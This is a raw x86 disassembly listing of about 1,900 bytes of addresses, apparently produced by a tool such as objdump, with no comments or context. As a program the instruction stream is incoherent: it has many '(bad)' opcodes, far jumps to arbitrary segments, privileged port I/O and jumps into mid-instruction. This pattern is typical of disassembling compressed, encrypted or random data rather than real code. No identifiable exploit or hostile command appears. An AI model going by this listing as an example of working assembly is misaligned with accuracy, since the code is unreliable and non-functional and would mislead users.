  4234b2:	dec    DWORD PTR [edi]
  4234b4:	mov    bh,0xa
  4234b6:	fcomip st,st(1)
  4234b8:	mov    edx,0xef1cb54d
  4234bd:	jmp    0xa699:0x38d23104
  4234c4:	cmp    eax,DWORD PTR [ecx+ebx*1]
  4234c7:	ds mov esp,0x5e14dcd0
  4234cd:	ja     0x423487
  4234cf:	mov    ebp,0x5c91dbde
  4234d4:	ret    0xe1d1
  4234d7:	or     eax,0x6c779fd1
  4234dc:	cmc    
  4234dd:	es scas eax,DWORD PTR es:[edi]
  4234df:	rol    BYTE PTR [edi],cl
  4234e1:	mov    esi,0x68213e28
  4234e6:	leave  
  4234e7:	jecxz  0x4234ce
  4234e9:	sub    BYTE PTR [edi+esi*4],cl
  4234ec:	or     edi,esi
  4234ee:	sbb    eax,0x9f4454df
  4234f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234f4:	dec    edi
  4234f5:	jge    0x423528
  4234f7:	call   0x7a8e:0x31ce79f3
  4234fe:	xchg   edx,eax
  4234ff:	cmp    DWORD PTR [edi+0x10],edi
  423502:	xor    BYTE PTR [esp+edi*2],bh
  423505:	add    al,0x8e
  423507:	fs popa 
  423509:	mov    bh,0x3d
  42350b:	cmp    al,0x37
  42350d:	fist   DWORD PTR [ecx+0x16a121e9]
  423513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423514:	test   al,0x66
  423516:	scas   eax,DWORD PTR es:[edi]
  423517:	and    DWORD PTR [ebx-0x1b5ddec7],ebx
  42351d:	sahf   
  42351e:	(bad)  
  423520:	jmp    FWORD PTR ds:0x7b444282
  423526:	mov    cl,BYTE PTR [edi-0x65]
  423529:	daa    
  42352a:	dec    ebx
  42352b:	pop    ebx
  42352c:	sub    esp,DWORD PTR [eax+eiz*1-0xe]
  423530:	call   0xcb7b05be
  423535:	(bad)  
  423536:	and    bh,BYTE PTR [edx+0x2c348d1b]
  42353c:	mov    edx,0x9dd698ab
  423541:	push   0x1b
  423543:	push   eax
  423544:	inc    ebp
  423545:	popa   
  423546:	imul   esp,DWORD PTR ds:0x6bd28182,0xffffff9f
  42354d:	pop    edx
  42354e:	jge    0x42351f
  423550:	add    eax,0xe9404c2f
  423555:	jmp    0x532445ed
  42355a:	lds    eax,FWORD PTR [ecx-0x388bfda8]
  423560:	add    al,0xaa
  423562:	scas   al,BYTE PTR es:[edi]
  423563:	xchg   ebx,eax
  423564:	mov    bl,0xea
  423566:	mov    ah,0x82
  423568:	cmp    BYTE PTR [edx],cl
  42356a:	retf   0xdf1a
  42356d:	hlt    
  42356e:	sub    BYTE PTR [ebx+ebp*8],al
  423571:	leave  
  423572:	mov    cl,0x9e
  423574:	test   eax,0x3dfe8d55
  423579:	dec    esp
  42357a:	fld    QWORD PTR [eax]
  42357c:	xchg   ebp,eax
  42357d:	lock out 0x4e,al
  423580:	jmp    0x4235aa
  423582:	pop    eax
  423583:	popa   
  423584:	push   esp
  423585:	int    0xe3
  423587:	mov    ecx,0x812458c0
  42358c:	add    ecx,DWORD PTR [ecx]
  42358e:	jecxz  0x423572
  423590:	cmp    DWORD PTR [eax+esi*2],0x2b254ae7
  423597:	arpl   WORD PTR [edi-0x6d8eb35f],di
  42359d:	rcl    BYTE PTR [edi],cl
  42359f:	ins    DWORD PTR es:[edi],dx
  4235a0:	sub    ch,BYTE PTR [esi+0x6540f939]
  4235a6:	repz jb 0x4235d4
  4235a9:	clc    
  4235aa:	cld    
  4235ab:	ds pop esp
  4235ad:	mov    al,0x52
  4235af:	pusha  
  4235b0:	xchg   esp,eax
  4235b1:	sub    DWORD PTR [edi+0x67],eax
  4235b4:	(bad)  
  4235b5:	cs cld 
  4235b7:	or     dl,BYTE PTR [esi]
  4235b9:	cmp    BYTE PTR [edi],0x94
  4235bc:	pop    ds
  4235bd:	je     0x423541
  4235bf:	pop    edx
  4235c0:	mov    edi,0x771a9b8e
  4235c5:	fld    st(3)
  4235c7:	xchg   BYTE PTR [eax],bl
  4235c9:	add    BYTE PTR [edx+0x8360a83],dh
  4235cf:	fimul  DWORD PTR [esi-0x7a03eb04]
  4235d5:	mov    esp,0xd875eeca
  4235da:	adc    al,0xd2
  4235dc:	shl    DWORD PTR [edx],cl
  4235de:	arpl   ax,bx
  4235e0:	lds    ebx,FWORD PTR [ecx-0x38]
  4235e3:	jl     0x42363f
  4235e5:	sbb    DWORD PTR [eax],ecx
  4235e7:	or     eax,0xe8216a07
  4235ec:	std    
  4235ed:	repz jb 0x42359f
  4235f0:	je     0x4235e6
  4235f2:	push   ebx
  4235f3:	out    dx,eax
  4235f4:	xchg   edi,eax
  4235f5:	add    al,0x74
  4235f7:	xor    ecx,DWORD PTR [edx+esi*1+0x5c840ec8]
  4235fe:	sub    al,0x2c
  423600:	push   ebp
  423601:	ins    BYTE PTR es:[edi],dx
  423602:	add    dh,BYTE PTR [edx-0x2456dd55]
  423608:	cmp    bl,dl
  42360a:	cli    
  42360b:	call   0x7806:0x61270875
  423612:	jb     0x423606
  423614:	mov    eax,ds:0x15fbc4e1
  423619:	push   cs
  42361a:	adc    dl,dl
  42361c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42361d:	aam    0x56
  42361f:	xor    BYTE PTR [eax+0x4d8bc36f],dh
  423625:	mov    edx,0xb3755841
  42362a:	dec    ecx
  42362b:	loope  0x423625
  42362d:	push   ds
  42362e:	mov    al,0xdf
  423630:	test   eax,0x73f1fcb8
  423635:	sbb    eax,0x89972cdf
  42363a:	cmp    eax,0x5fc1d66
  42363f:	add    BYTE PTR [ecx],dh
  423641:	inc    edi
  423642:	inc    esp
  423643:	push   ebx
  423644:	or     eax,0x203e954b
  423649:	out    0xa3,al
  42364b:	ret    0x8d28
  42364e:	jb     0x423631
  423650:	inc    esp
  423651:	test   DWORD PTR [ebx+edx*4-0x7c99b26d],0x6349e187
  42365c:	xchg   edx,eax
  42365d:	adc    eax,0x94ecef27
  423662:	mov    dh,0x14
  423664:	xor    al,0x9b
  423666:	test   dh,0xd8
  423669:	inc    ebp
  42366a:	inc    edi
  42366b:	xor    eax,0x8ad2e119
  423670:	push   eax
  423671:	inc    ebp
  423672:	out    0x48,al
  423674:	popf   
  423675:	jmp    0x4236b8
  423677:	test   al,0x21
  423679:	cli    
  42367a:	(bad)  ds:0x73ee1402
  423680:	daa    
  423681:	or     BYTE PTR [ecx-0x7e24a59d],bl
  423687:	rcr    BYTE PTR [eax],1
  423689:	pusha  
  42368a:	and    DWORD PTR [eax+0x6],esi
  42368d:	pop    di
  42368f:	stos   DWORD PTR es:[edi],eax
  423690:	push   cs
  423691:	ja     0x4236bf
  423693:	jae    0x42362e
  423695:	call   0x63183c8f
  42369a:	das    
  42369b:	jmp    0x4236c9
  42369d:	xchg   edx,eax
  42369e:	push   cs
  42369f:	std    
  4236a0:	xor    eax,0xa73a5fef
  4236a5:	lods   al,BYTE PTR ds:[esi]
  4236a6:	fbstp  TBYTE PTR [esi+0x7]
  4236a9:	imul   edi,DWORD PTR [edx-0x2e],0x64276f8a
  4236b0:	jne    0x42367f
  4236b2:	jnp    0x4236e9
  4236b4:	sub    al,BYTE PTR [ebx+0x367215c1]
  4236ba:	inc    ecx
  4236bb:	mov    WORD PTR [esi-0x346f876e],cs
  4236c1:	or     al,BYTE PTR [eax-0x17]
  4236c4:	lock or BYTE PTR [eax-0x6ac9b7d2],0xa3
  4236cc:	icebp  
  4236cd:	les    eax,FWORD PTR [edi-0x62ade867]
  4236d3:	outs   dx,DWORD PTR ds:[esi]
  4236d4:	imul   ecx,DWORD PTR [edi],0xcef7d951
  4236da:	ds stos DWORD PTR es:[edi],eax
  4236dc:	or     al,cl
  4236de:	and    ecx,esp
  4236e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236e1:	fstp   TBYTE PTR [ecx+0x62]
  4236e4:	add    ecx,DWORD PTR [edi+0xc118170]
  4236ea:	scas   al,BYTE PTR es:[edi]
  4236eb:	adc    DWORD PTR [edi],esi
  4236ed:	ins    BYTE PTR es:[edi],dx
  4236ee:	mov    esi,0xdaf098f6
  4236f3:	(bad)  
  4236f4:	mov    esi,0x38d9c26a
  4236f9:	push   ss
  4236fa:	jbe    0x423714
  4236fc:	xor    esi,edi
  4236fe:	fsubrp st(1),st
  423700:	jecxz  0x42369d
  423702:	cs and al,0xf0
  423705:	and    al,0x40
  423707:	jmp    0x46eb2324
  42370c:	xor    DWORD PTR [ecx+0x61],edi
  42370f:	aas    
  423710:	mov    ch,BYTE PTR [esi-0x23]
  423713:	idiv   BYTE PTR [edi]
  423715:	pop    ecx
  423716:	jb     0x423763
  423718:	push   ecx
  423719:	jnp    0x423753
  42371b:	mov    cl,0x3a
  42371d:	lahf   
  42371e:	jg     0x423776
  423720:	mov    eax,ds:0x2054972d
  423725:	pop    ds
  423726:	faddp  st(1),st
  423728:	mov    al,ds:0x839594c4
  42372d:	xchg   esi,eax
  42372e:	fdiv   QWORD PTR [edx-0x41]
  423731:	mov    dh,0x93
  423733:	xchg   ebx,eax
  423734:	test   DWORD PTR [edx-0xbfef4ee],0xe639e480
  42373e:	add    cl,bh
  423740:	fwait
  423741:	xlat   BYTE PTR ds:[ebx]
  423742:	mov    edi,0xc6f452c8
  423747:	in     eax,0xbf
  423749:	inc    edi
  42374a:	test   eax,0x78bb9fad
  42374f:	adc    eax,0x9d323f16
  423754:	retf   0x1aae
  423757:	adc    eax,0xbdc4fc4f
  42375c:	push   ecx
  42375d:	cmp    BYTE PTR [edi+0x242e5d97],0x70
  423764:	sub    DWORD PTR [ebx],esp
  423766:	push   0xdbb88a53
  42376b:	mov    BYTE PTR [edx+0x1a],0x81
  42376f:	sahf   
  423770:	bound  esp,QWORD PTR [ebx-0x13]
  423773:	pop    esi
  423774:	jecxz  0x423712
  423776:	rcl    dh,0x64
  423779:	dec    esi
  42377a:	popf   
  42377b:	retf   
  42377c:	sbb    DWORD PTR [eax],0xc108e244
  423782:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423783:	jo     0x423789
  423785:	stc    
  423786:	stc    
  423787:	xchg   DWORD PTR [ebp-0x33],edx
  42378a:	mov    eax,0xd2f7aa26
  42378f:	xchg   ecx,eax
  423790:	pushf  
  423791:	test   BYTE PTR [esi],ch
  423793:	leave  
  423794:	pop    ebx
  423795:	cli    
  423796:	ffreep st(2)
  423798:	mov    ecx,0x6fc01319
  42379d:	mov    DWORD PTR [ebp+0x1d],0x3b959587
  4237a4:	mov    al,0x81
  4237a6:	fild   DWORD PTR [ebx-0x62]
  4237a9:	stos   DWORD PTR es:[edi],eax
  4237aa:	push   0xd38738fd
  4237af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237b0:	cdq    
  4237b1:	hlt    
  4237b2:	cmp    al,0xeb
  4237b4:	js     0x423779
  4237b6:	int3   
  4237b7:	inc    edi
  4237b8:	scas   al,BYTE PTR es:[edi]
  4237b9:	mov    BYTE PTR [edx],0x85
  4237bc:	adc    dl,BYTE PTR [esi-0x5b2e7ec7]
  4237c2:	xchg   ebx,eax
  4237c3:	mov    ecx,0x5a608bb9
  4237c8:	loopne 0x423770
  4237ca:	mov    edi,0xa51c97d7
  4237cf:	jae    0x4237ff
  4237d1:	scas   al,BYTE PTR es:[edi]
  4237d2:	mov    ah,0xc9
  4237d4:	add    ecx,eax
  4237d6:	jp     0x423803
  4237d8:	cmc    
  4237d9:	cmp    bh,0xec
  4237dc:	sub    edi,edi
  4237de:	xor    al,0x70
  4237e0:	leave  
  4237e1:	lds    edi,FWORD PTR [edi+0x5b]
  4237e4:	add    bh,BYTE PTR [edx+eax*4]
  4237e7:	dec    eax
  4237e8:	sar    DWORD PTR [ebx+0x2a58009a],1
  4237ee:	mov    ecx,esi
  4237f0:	gs pop esi
  4237f2:	repz and al,0xb7
  4237f5:	jmp    0xd807:0xab6624e3
  4237fc:	xchg   ecx,eax
  4237fd:	xor    cl,0x17
  423800:	inc    ebp
  423801:	out    dx,eax
  423802:	(bad)  
  423803:	hlt    
  423804:	pop    esp
  423805:	jmp    0x9269:0xfa426abc
  42380c:	fimul  DWORD PTR [eax+0x3fce20c7]
  423812:	push   ds
  423813:	inc    ebp
  423814:	out    dx,eax
  423815:	sub    al,0x8a
  423817:	inc    ebp
  423818:	aam    0x77
  42381a:	push   esi
  42381b:	and    ecx,esi
  42381d:	retf   0xf31d
  423820:	clc    
  423821:	adc    edi,esp
  423823:	rcr    DWORD PTR [edx-0x1ba2d36b],0x56
  42382a:	enter  0x2763,0x61
  42382e:	push   0x349b9985
  423833:	adc    eax,0x2a59e8a4
  423838:	shr    BYTE PTR [ecx],cl
  42383a:	or     al,0x5a
  42383c:	adc    eax,0xfd39d4dc
  423841:	neg    dh
  423843:	push   ss
  423844:	sti    
  423845:	mov    eax,0x4c4ecf2c
  42384a:	js     0x423882
  42384c:	dec    edi
  42384d:	arpl   WORD PTR fs:[edx+0x77],ax
  423851:	(bad)  
  423852:	dec    edi
  423853:	out    dx,al
  423854:	call   0x3fa2:0xb063e4b3
  42385b:	inc    ebx
  42385c:	sub    dh,dh
  42385e:	xor    BYTE PTR [ebx],bl
  423860:	xchg   ebx,eax
  423861:	ja     0x423821
  423863:	and    ah,bh
  423865:	jp     0x423846
  423867:	outs   dx,DWORD PTR ds:[esi]
  423868:	cld    
  423869:	cmc    
  42386a:	adc    al,0x90
  42386c:	ffreep st(0)
  42386e:	fsubr  QWORD PTR [ebp+0x6cf058f0]
  423874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423875:	mov    ch,0x54
  423877:	in     eax,0x1
  423879:	adc    al,0x8
  42387b:	rcl    edi,1
  42387d:	jo     0x423883
  42387f:	xor    cl,BYTE PTR [edi]
  423881:	push   esp
  423882:	repz xor BYTE PTR [ecx+0x62dd5c08],dl
  423889:	inc    eax
  42388a:	(bad)  
  42388b:	int3   
  42388c:	lods   eax,DWORD PTR ds:[esi]
  42388d:	dec    ebp
  42388e:	pushw  es
  423890:	lods   al,BYTE PTR ds:[esi]
  423891:	cmp    edi,DWORD PTR [ebp-0x76ede9d]
  423897:	rol    BYTE PTR [edx],cl
  423899:	inc    eax
  42389a:	mov    edx,0x96a3414c
  42389f:	xchg   ebx,eax
  4238a0:	sub    al,0x81
  4238a2:	icebp  
  4238a3:	aad    0xc1
  4238a5:	mov    edi,DWORD PTR [esi+0x7e]
  4238a8:	(bad)
  4238ab:	pop    ebp
  4238ac:	ss stc 
  4238ae:	in     eax,dx
  4238af:	retf   0x9566
  4238b2:	in     al,dx
  4238b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238b4:	pop    ss
  4238b5:	js     0x4238d6
  4238b7:	retfw  
  4238b9:	outs   dx,DWORD PTR ds:[esi]
  4238ba:	pop    ecx
  4238bb:	jecxz  0x423864
  4238bd:	out    dx,al
  4238be:	(bad)  
  4238bf:	aam    0x7f
  4238c1:	pop    ecx
  4238c2:	sbb    al,0x85
  4238c4:	das    
  4238c5:	xchg   ebp,eax
  4238c6:	loope  0x4238fd
  4238c8:	je     0x4238d8
  4238ca:	(bad)
  4238cd:	mov    ds:0x64fa2f66,eax
  4238d2:	pop    ebx
  4238d3:	repz jbe 0x42394d
  4238d6:	data16 hlt 
  4238d8:	inc    ebp
  4238d9:	or     DWORD PTR [eax+edi*2],esp
  4238dc:	inc    ecx
  4238dd:	inc    ecx
  4238de:	jns    0x4238bb
  4238e0:	mov    edi,0xd8851d9f
  4238e5:	and    eax,0xd9c68d02
  4238ea:	sahf   
  4238eb:	jae    0x423968
  4238ed:	mov    es,WORD PTR [eax+0x36]
  4238f0:	xchg   ebx,eax
  4238f1:	or     eax,0xb5c035e6
  4238f6:	lods   al,BYTE PTR ds:[esi]
  4238f7:	leave  
  4238f8:	add    ebx,esi
  4238fa:	mov    ds:0xa5659d08,al
  4238ff:	leave  
  423900:	cmp    ah,BYTE PTR [esi+0x7db41689]
  423906:	add    al,BYTE PTR [edi+0x2]
  423909:	or     al,0x14
  42390b:	mov    dh,0xea
  42390d:	mov    eax,ds:0xa299b5ce
  423912:	add    DWORD PTR [ecx-0x2],esi
  423915:	mov    bl,0xff
  423917:	xchg   edx,eax
  423918:	ins    BYTE PTR es:[edi],dx
  423919:	fsub   st(0),st
  42391b:	clc    
  42391c:	jmp    0x6eb574ce
  423921:	sub    bh,cl
  423923:	das    
  423924:	ins    BYTE PTR es:[edi],dx
  423925:	mov    esi,0x7784896
  42392a:	scas   al,BYTE PTR es:[edi]
  42392b:	push   eax
  42392c:	rcl    DWORD PTR [eax+0x5a2ce5a7],0x9a
  423933:	pop    ebx
  423934:	mov    ebx,0xfb5730b4
  423939:	pop    edi
  42393a:	ins    DWORD PTR es:[edi],dx
  42393b:	fild   DWORD PTR [eax+0x7b]
  42393e:	inc    ebp
  42393f:	lods   al,BYTE PTR ds:[esi]
  423940:	jecxz  0x4239bc
  423942:	(bad)
  423945:	lods   al,BYTE PTR ds:[esi]
  423946:	lahf   
  423947:	cmp    edx,DWORD PTR [esi-0x5192ad15]
  42394d:	and    eax,DWORD PTR [ebp+0x3c4c42a5]
  423953:	adc    cl,bl
  423955:	push   cs
  423956:	loopne 0x423994
  423958:	push   edx
  423959:	inc    esi
  42395a:	ret    0xbfe1
  42395d:	ds (bad) 
  42395f:	inc    ebx
  423960:	and    BYTE PTR [ebp+ebp*8-0x26],bh
  423964:	push   eax
  423965:	mov    eax,ds:0x4269ca46
  42396a:	xor    edx,ecx
  42396c:	out    dx,al
  42396d:	or     esp,ebp
  42396f:	rcl    ecx,cl
  423971:	(bad)  
  423972:	push   ebp
  423973:	sahf   
  423974:	mov    ch,0xc4
  423976:	pop    edx
  423977:	sbb    DWORD PTR [ecx-0x711bfa25],0x6
  42397e:	stc    
  42397f:	clc    
  423980:	lea    eax,[ecx+0x4f]
  423983:	mov    edx,0x8f2cdce
  423988:	xor    ah,ah
  42398a:	js     0x4239a8
  42398c:	cmp    eax,0x4c17aa8a
  423991:	or     eax,0xb16868f4
  423996:	xchg   ebp,eax
  423997:	test   BYTE PTR ds:0xb768363e,dh
  42399d:	in     eax,dx
  42399e:	xchg   ecx,eax
  42399f:	mov    al,ds:0x19fc6476
  4239a4:	jl     0x423988
  4239a6:	ja     0x423956
  4239a8:	fsub   QWORD PTR [ecx+ecx*1+0x5bf8d7cc]
  4239af:	imul   esi,DWORD PTR [edx+0x7cad8eec],0x5e
  4239b6:	mov    BYTE PTR [esi],bl
  4239b8:	push   ebx
  4239b9:	and    DWORD PTR [edi],ecx
  4239bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239bc:	test   DWORD PTR [esi],0x5c6ccf5e
  4239c2:	pusha  
  4239c3:	es pop ds
  4239c5:	in     eax,0x2b
  4239c7:	jne    0x423a16
  4239c9:	jnp    0x423987
  4239cb:	scas   eax,DWORD PTR es:[edi]
  4239cc:	push   edi
  4239cd:	push   ds
  4239ce:	ret    0xef6
  4239d1:	mov    ch,0xbb
  4239d3:	into   
  4239d4:	xchg   DWORD PTR [edx-0x39],ebx
  4239d7:	outs   dx,BYTE PTR ds:[esi]
  4239d8:	inc    ecx
  4239d9:	xlat   BYTE PTR ds:[ebx]
  4239da:	stos   DWORD PTR es:[edi],eax
  4239db:	or     al,0x80
  4239dd:	push   edx
  4239de:	les    esp,FWORD PTR [ecx+0x49]
  4239e1:	test   eax,0xde123c39
  4239e6:	lds    ebx,FWORD PTR [edx+0xd]
  4239e9:	jge    0x423a69
  4239eb:	pop    ebp
  4239ec:	shr    BYTE PTR [ecx],1
  4239ee:	push   0x63f3848c
  4239f3:	xor    eax,0x722792a
  4239f8:	test   al,0x35
  4239fa:	push   esi
  4239fb:	inc    edx
  4239fc:	test   eax,0xf3cc9e68
  423a01:	fwait
  423a02:	mov    BYTE PTR [ebx],ch
  423a04:	(bad)  
  423a05:	cdq    
  423a06:	cmp    BYTE PTR [edi],ch
  423a08:	mov    cl,0xe3
  423a0a:	add    al,0x56
  423a0c:	lods   eax,DWORD PTR ds:[esi]
  423a0d:	fcomp  QWORD PTR [ecx-0x3119ab87]
  423a13:	ret    0x1cc2
  423a16:	std    
  423a17:	mov    al,0x58
  423a19:	adc    ebp,ebx
  423a1b:	out    dx,al
  423a1c:	inc    ecx
  423a1d:	lods   eax,DWORD PTR ds:[esi]
  423a1e:	rol    bl,0xe
  423a21:	lahf   
  423a22:	push   ebx
  423a23:	xchg   edx,eax
  423a24:	pop    ds
  423a25:	inc    edx
  423a26:	fstp   DWORD PTR [edx+ebp*1-0x21]
  423a2a:	push   ecx
  423a2b:	sahf   
  423a2c:	(bad)  
  423a2d:	jae    0x423a54
  423a2f:	inc    BYTE PTR [esp+ebp*4+0x78]
  423a33:	fisttp WORD PTR [ebx+0x3744ac09]
  423a39:	lock jne 0x4239bf
  423a3c:	push   ebp
  423a3d:	test   DWORD PTR [edi-0x51],ecx
  423a40:	dec    esi
  423a41:	sub    al,0x9a
  423a43:	mov    dl,0x1d
  423a45:	sub    al,0xdb
  423a47:	test   DWORD PTR [ebx+0x46f3b572],edx
  423a4d:	popa   
  423a4e:	and    BYTE PTR [edi+0x2d93f92b],bh
  423a54:	mov    ecx,DWORD PTR [ebx-0x2e4949fe]
  423a5a:	js     0x423a0f
  423a5c:	sbb    al,0xd8
  423a5e:	xchg   DWORD PTR [edi+0x30],ebx
  423a61:	lea    eax,[eax-0x24]
  423a64:	pop    es
  423a65:	ss in  al,dx
  423a67:	cmp    al,0x2b
  423a69:	lahf   
  423a6a:	in     al,dx
  423a6b:	aaa    
  423a6c:	loope  0x423a0e
  423a6e:	sub    DWORD PTR [ebp-0x4bf5489],esi
  423a74:	repnz rol ecx,0x6d
  423a78:	add    BYTE PTR [edx-0x3c3341dd],al
  423a7e:	outs   dx,DWORD PTR ds:[esi]
  423a7f:	mov    DWORD PTR [edx-0x5d98f27a],edx
  423a85:	lahf   
  423a86:	scas   al,BYTE PTR es:[edi]
  423a87:	es dec edi
  423a89:	ret    0x5146
  423a8c:	or     BYTE PTR [eax+0x36],dl
  423a8f:	mov    ecx,0xcb5c20da
  423a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a95:	push   ebp
  423a96:	repnz xlat BYTE PTR ds:[ebx]
  423a98:	cmp    al,0x2d
  423a9a:	push   0xa
  423a9c:	mov    eax,0x2e3d980e
  423aa1:	adc    BYTE PTR [eax+0x328b6222],ch
  423aa7:	jl     0x423ada
  423aa9:	or     ch,BYTE PTR [edx]
  423aab:	push   ds
  423aac:	popa   
  423aad:	icebp  
  423aae:	retf   0x7766
  423ab1:	xchg   esp,eax
  423ab2:	je     0x423ac8
  423ab4:	mov    WORD PTR [ebp-0xe],?
  423ab7:	aas    
  423ab8:	int    0x21
  423aba:	lods   al,BYTE PTR ds:[esi]
  423abb:	inc    edi
  423abc:	fcmovne st,st(7)
  423abe:	aam    0x5d
  423ac0:	sbb    al,0x32
  423ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ac3:	jne    0x423b17
  423ac5:	and    eax,0xd113d4d5
  423aca:	outs   dx,BYTE PTR ds:[esi]
  423acb:	and    esi,DWORD PTR [ebx+0x4a]
  423ace:	(bad)
  423ad3:	(bad)
  423ad7:	ins    BYTE PTR es:[edi],dx
  423ad8:	push   0xffffffac
  423ada:	xchg   ebp,eax
  423adb:	ja     0x423b30
  423add:	dec    edi
  423ade:	es add eax,0x981ede01
  423ae4:	ja     0x423b2f
  423ae6:	adc    eax,0x319cd021
  423aeb:	mov    ebp,0x5791ff4d
  423af0:	(bad)  
  423af1:	push   edi
  423af2:	loop   0x423afd
  423af4:	jp     0x423ae6
  423af6:	ret    0xf131
  423af9:	xchg   ebp,eax
  423afa:	dec    edi
  423afb:	retf   
  423afc:	sbb    BYTE PTR [eax+0x103564fd],0x3f
  423b03:	or     ah,BYTE PTR [edx]
  423b05:	cmp    eax,0x34
  423b08:	stc    
  423b09:	shl    bl,cl
  423b0b:	icebp  
  423b0c:	test   eax,0xdd06018e
  423b11:	xchg   ebx,eax
  423b12:	add    BYTE PTR [eax],0xda
  423b15:	into   
  423b16:	sbb    DWORD PTR [edx+0x7b63297d],edi
  423b1c:	test   al,0x53
  423b1e:	repnz enter 0x3046,0x18
  423b23:	push   edx
  423b24:	cmp    eax,0xc58929ab
  423b29:	sub    ch,BYTE PTR [edx-0x60]
  423b2c:	push   edi
  423b2d:	adc    esi,esi
  423b2f:	imul   ebp,DWORD PTR [edx-0x4c50a035],0xffffff99
  423b36:	jmp    0x423adb
  423b38:	mov    bl,dl
  423b3a:	lods   eax,DWORD PTR ds:[esi]
  423b3b:	test   BYTE PTR [edx+0x5f],al
  423b3e:	lods   eax,DWORD PTR ds:[esi]
  423b3f:	jp     0x423b50
  423b41:	push   es
  423b42:	sahf   
  423b43:	pop    edx
  423b44:	fist   WORD PTR [ecx]
  423b46:	mov    gs,WORD PTR [edx]
  423b48:	xor    BYTE PTR [edi],0xe6
  423b4b:	add    ah,BYTE PTR [edx-0x62]
  423b4e:	hlt    
  423b4f:	dec    ebx
  423b50:	push   ss
  423b51:	cmp    eax,0x819f4585
  423b56:	scas   eax,DWORD PTR es:[edi]
  423b57:	mov    ebp,0x32468fc4
  423b5c:	dec    ebx
  423b5d:	not    esp
  423b5f:	jge    0x423af3
  423b61:	push   edx
  423b62:	mov    dl,0x19
  423b64:	lea    edi,[ebx+0x150fb69f]
  423b6a:	mov    ebp,0x14f21093
  423b6f:	mov    ah,0xe1
  423b71:	mov    eax,ds:0xca13bb13
  423b76:	xchg   ecx,eax
  423b77:	push   ds
  423b78:	sub    BYTE PTR [ebx],ah
  423b7a:	js     0x423b8c
  423b7c:	out    0x2d,al
  423b7e:	bound  esp,QWORD PTR [ebx]
  423b80:	dec    ebx
  423b81:	fmul   DWORD PTR [ecx]
  423b83:	xor    bl,dl
  423b85:	inc    ebp
  423b86:	dec    eax
  423b87:	mov    ah,0x92
  423b89:	adc    al,0x8b
  423b8b:	iret   
  423b8c:	add    al,0x39
  423b8e:	inc    edi
  423b8f:	lahf   
  423b90:	pop    esp
  423b91:	push   esi
  423b92:	loopne 0x423b57
  423b94:	lahf   
  423b95:	sub    eax,0xb38c80b
  423b9a:	and    eax,0xaaff3a4a
  423b9f:	cld    
  423ba0:	aaa    
  423ba1:	leave  
  423ba2:	dec    BYTE PTR [edi+ebx*2+0x7b5e5569]
  423ba9:	hlt    
  423baa:	and    BYTE PTR [eax-0x604a9632],cl
  423bb0:	or     dh,al
  423bb2:	pop    es
  423bb3:	pop    edx
  423bb4:	fcomi  st,st(4)
  423bb6:	mul    BYTE PTR [edi-0x41ed34c1]
  423bbc:	(bad)  
  423bbd:	xlat   BYTE PTR ds:[ebx]
  423bbe:	repnz loope 0x423b9c
  423bc1:	sub    al,0xd2
  423bc3:	data16 sbb bl,BYTE PTR [eax+eax*1]
  423bc7:	fstp   DWORD PTR [ecx]
  423bc9:	je     0x423c00
  423bcb:	and    edi,DWORD PTR [edi+eax*4-0x43dd00ff]
  423bd2:	mov    ds:0xf42150e3,al
  423bd7:	pop    ebx
  423bd8:	arpl   WORD PTR ds:0x9e5f1a78,ax
  423bde:	push   edx
  423bdf:	jmp    FWORD PTR [edx]
  423be1:	dec    esp
  423be2:	fwait
  423be3:	xchg   esi,eax
  423be4:	and    ebp,0x74de628c
  423bea:	outs   dx,DWORD PTR ds:[esi]
  423beb:	fcmovne st,st(2)
  423bed:	push   esi
  423bee:	retf   
  423bef:	push   ds
  423bf0:	fcmovb st,st(5)
  423bf2:	cs push edi
  423bf4:	imul   ebx,DWORD PTR [edi+0x4b],0x36575594
  423bfb:	mov    ch,0xba
  423bfd:	mov    dh,0xd7
  423bff:	jg     0x423ba2
  423c01:	(bad)  
  423c02:	imul   edi,DWORD PTR [ebx],0x33
  423c05:	ins    DWORD PTR es:[edi],dx
  423c06:	rol    DWORD PTR [ecx-0x6bcfafdc],1
  423c0c:	pop    edi
  423c0d:	jmp    0x9a49:0xdbb9bf3f
  423c14:	mov    esi,0x38b6d61c
  423c19:	xchg   ecx,eax
  423c1a:	jp     0x423c62
  423c1c:	stos   DWORD PTR es:[edi],eax
  423c1d:	cli    
  423c1e:	pop    edi
  423c1f:	mov    edx,0x61277a4e
  423c24:	xlat   BYTE PTR ds:[ebx]
  423c25:	nop
  423c26:	lahf   
  423c27:	sub    ebp,ebx
  423c29:	mov    ds:0xb99589a2,al
  423c2e:	mov    esi,0xeeaef495
  423c33:	and    bh,0x28
  423c36:	xchg   BYTE PTR [edx-0x5a4ea265],dl
  423c3c:	and    eax,ebx
  423c3e:	(bad)  
  423c3f:	into   
  423c40:	ret    0x3a92
  423c43:	jb     0x423c19
  423c45:	add    al,BYTE PTR [edi+0xf]
  423c48:	nop
  423c49:	mov    ds:0x71131014,al
  423c4e:	hlt    
  423c4f:	and    dl,BYTE PTR [ecx]
  423c51:	mov    ah,BYTE PTR [edx+ebx*4-0x7831688e]
  423c58:	hlt    
  423c59:	jmp    0x423bfc
  423c5b:	push   ds
  423c5c:	dec    ebp
  423c5d:	jae    0x423bfb
  423c5f:	adc    DWORD PTR [eax],eax
  423c61:	popf   
  423c62:	sub    BYTE PTR [edi+0x3f29ca90],0x13
  423c69:	pop    ebp
  423c6a:	jmp    0x423c30
  423c6c:	dec    esi
  423c6d:	(bad)  [ecx+eiz*8-0x6f]
  423c71:	or     esi,0x4a
  423c74:	sbb    esp,ebp
  423c76:	fisubr WORD PTR [eax+0x259cf798]
  423c7c:	shr    BYTE PTR [esi+0x25],1
  423c7f:	sbb    eax,DWORD PTR [ebp+0x683778b4]
  423c85:	sub    ch,al
  423c87:	mov    eax,ds:0x9883658d
